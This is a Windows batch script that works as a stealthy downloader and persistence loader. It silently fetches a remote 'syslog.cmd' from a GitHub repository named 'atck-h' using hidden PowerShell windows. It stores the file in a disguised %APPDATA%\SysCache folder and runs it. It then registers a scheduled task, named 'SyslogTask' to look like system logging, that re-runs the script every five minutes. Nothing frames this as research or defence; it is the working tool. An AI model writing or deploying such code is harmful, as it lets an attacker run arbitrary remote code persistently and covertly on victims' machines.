@echo off
setlocal enabledelayedexpansion

set VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt
set FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd

set BASE_FOLDER=%APPDATA%\SysCache
if not exist "%BASE_FOLDER%" mkdir "%BASE_FOLDER%"

set LOCAL_VERSION_FILE=%BASE_FOLDER%\local_version.txt
set REMOTE_VERSION_FILE=%TEMP%\rv.txt
set DOWNLOAD_FILE=%TEMP%\sn.cmd
set FINAL_FILE=%BASE_FOLDER%\syslog.cmd

:: Download remote version silently
powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VERSION_FILE%' -ErrorAction Stop} catch {}" >nul 2>&1

if not exist "%REMOTE_VERSION_FILE%" exit

set /p REMOTE_VERSION=<"%REMOTE_VERSION_FILE%"

if not exist "%LOCAL_VERSION_FILE%" goto UPDATE

set /p LOCAL_VERSION=<"%LOCAL_VERSION_FILE%"

if "%LOCAL_VERSION%"=="%REMOTE_VERSION%" goto RUN

:UPDATE
powershell -WindowStyle Hidden -Command "try {Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD_FILE%' -ErrorAction Stop} catch {}" >nul 2>&1

if exist "%DOWNLOAD_FILE%" (
    move /Y "%DOWNLOAD_FILE%" "%FINAL_FILE%" >nul
    echo %REMOTE_VERSION% > "%LOCAL_VERSION_FILE%"
)

:RUN
if exist "%FINAL_FILE%" (
    start "" "%FINAL_FILE%"
)

:: --- New section: create scheduled task to run every 5 minutes ---
:: Task name: "SyslogTask"
:: Runs: %FINAL_FILE%
:: Frequency: every 5 minutes, indefinitely
:: /f forces overwrite if the task already exists
schtasks /create /tn "SyslogTask" /tr "cmd /c start /min \"\" \"%FINAL_FILE%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal